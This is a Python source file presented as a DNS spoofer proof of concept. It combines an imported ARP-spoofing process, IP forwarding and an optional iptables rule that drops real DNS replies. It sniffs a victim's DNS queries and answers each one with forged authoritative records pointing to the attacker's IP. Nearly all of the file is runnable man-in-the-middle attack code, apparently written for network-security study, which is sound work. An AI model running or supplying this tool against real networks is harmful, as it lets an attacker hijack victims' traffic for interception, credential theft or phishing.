#!/usr/bin/python

#-----------------------------------------------------------------------------
#-- SOURCE FILE:    dnsSpoof.py -   DNS Spoofer Proof of Concept
#--
#-- FUNCTIONS:      configSectionMap(section)
#--                 signalHandler(signal, frame)
#--                 forward()
#--                 default()
#--
#-- DATE:           November 5, 2015
#--
#-- DESIGNERS:      Brij Shah, Callum Styan
#--
#-- PROGRAMMERS:    Brij Shah, Callum Styan
#--
#-- NOTES:
#--
#-----------------------------------------------------------------------------

import ConfigParser, os, platform, sys, signal, multiprocessing, logging, time, argparse, arpSpoof
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import time
import argparse
import scapy
from scapy.all import *
from scapy.layers.dns import DNSRR, DNS, DNSQR
import arpSpoof, scan

operatingSystem = platform.system()
variables = 0

#-----------------------------------------------------------------------------
#-- FUNCTION:       configSectionMap(section)
#--
#-- VARIABLES(S):   section - the section in the config file
#--
#-- NOTES:
#--
#-----------------------------------------------------------------------------
def configSectionMap(section):
    dict = {}
    config = ConfigParser.ConfigParser()
    config.read('arp.config')
    options = config.options(section)
    for option in options:
        try:
            dict[option] = config.get(section, option)
            if dict[option] == -1:
                DebugPrint("skip: %s" % option)
        except:
            print ("exception on %s!" % option)
            dict[option] = None
    return dict

#-----------------------------------------------------------------------------
#-- FUNCTION:       signalHandler(signal, frame)
#--
#-- VARIABLES(S):   signal
#--
#-- NOTES:
#--
#-----------------------------------------------------------------------------
def signalHandler(signal, frame):
    default()
    sys.exit(0)

#-----------------------------------------------------------------------------
#-- FUNCTION:       forward()
#--
#-- NOTES:
#--
#-----------------------------------------------------------------------------
def forward():
    if operatingSystem == 'Darwin':
        os.system('sysctl -w net.inet.ip.forwarding=1')
    elif operatingSystem == 'Linux':
        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

#-----------------------------------------------------------------------------
#-- FUNCTION:       default()
#--
#-- NOTES:
#--
#-----------------------------------------------------------------------------
def default():
    if operatingSystem == 'Darwin':
        os.system('sysctl -w net.inet.ip.forwarding=0')
    elif operatingSystem == 'Linux':
        os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
        os.system('iptables -F')

#-----------------------------------------------------------------------------
#-- FUNCTION:       parse(packet)
#--
#-- VARIABLES(S):   packet - the packets being sniffed
#--
#-- NOTES:
#--
#-----------------------------------------------------------------------------
def parse(packet):
    global variables
    if packet.haslayer(IP):
        if packet[0][1].src == variables['victimip']:
            if packet.haslayer(DNS):
                if DNSQR in packet:
                    packetResponse = (Ether()/IP(dst=packet[0][1].src, src=packet[0][1].dst)/\
                                  UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/\
                                  DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, qr=1, \
                                  an=DNSRR(rrname=packet[DNS].qd.qname,  ttl=10, rdata=variables['ourip'])))
                    sendp(packetResponse, count=1, verbose=0)

#-----------------------------------------------------------------------------
#-- FUNCTION:       firewallRule()
#--
#-- NOTES:
#--
#-----------------------------------------------------------------------------
def firewallRule():
	firewall = "iptables -A FORWARD -p UDP --dport 53 -j DROP"
	Popen([firewall], shell=True, stdout=PIPE)

#-----------------------------------------------------------------------------
#-- FUNCTION:       main()
#--
#-- NOTES:
#--
#-----------------------------------------------------------------------------
def main():
    global variables
    forward()
    variables = configSectionMap('ARP')
    arpProcess = multiprocessing.Process(target = arpSpoof.arpSpoof
                                        , args = (variables['routerip']
                                                 , variables['routermac']
                                                 , variables['victimip']
                                                 , variables['victimmac']
                                                 , variables['ourmac']))
    arpProcess.start()
    signal.signal(signal.SIGINT, signalHandler)
    sniffFilter="udp and port 53"
    sniff(filter=sniffFilter, prn=parse, count=0)
    signal.pause()
    arpProcess.terminate()


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("-ip"
                       ,"--iptablesRule"
                       , help="use an iptables rule to drop all dns traffic on forward chain"
                       ,action="store_true")
    args = parser.parse_args()
    if args.iptablesRule:
        firewallRule()
    try:
        main()
    except KeyboardInterrupt:
        print 'exiting..'
